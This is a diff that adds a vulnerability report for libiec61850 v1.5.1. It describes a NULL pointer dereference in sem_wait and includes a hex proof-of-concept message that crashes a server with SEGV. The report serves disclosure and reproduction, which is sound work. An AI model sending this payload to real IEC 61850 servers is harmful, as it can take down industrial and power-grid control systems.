@@ -1,0 +1,15 @@
+Number: 543
+
+Summarize:
+libiec61850 v1.5.1 is reported to have a NULL pointer dereference in sem_wait when a server receives a specific message. The report attributes this to the semaphore pointer being NULL or not properly initialized before use. The demonstrated result is a Segmentation Fault (SEGV).
+
+Reproduce:
+Have a server using libiec61850 v1.5.1 running. Send the following POC message to the server:
+0300 0040 02f0 8001 0001 0061 3330 3102
+0100 a02c a12a 0202 0000 0200 7f4a 01a1
+1fa0 1d30 1ba0 19a1 171a 0b54 454d 504c
+4154 454c 4430 1a08 5350 5633 3244 4d58
+Expected result: the server encounters the reported NULL pointer dereference in sem_wait and crashes with SEGV.
+
+Payload:
+03 00 00 40 02 f0 80 01 00 01 00 61 33 30 31 02 01 00 a0 2c a1 2a 02 02 00 00 02 00 7f 4a 01 a1 1f a0 1d 30 1b a0 19 a1 17 1a 0b 54 45 4d 50 4c 41 54 45 4c 44 30 1a 08 53 50 56 33 32 44 4d 58
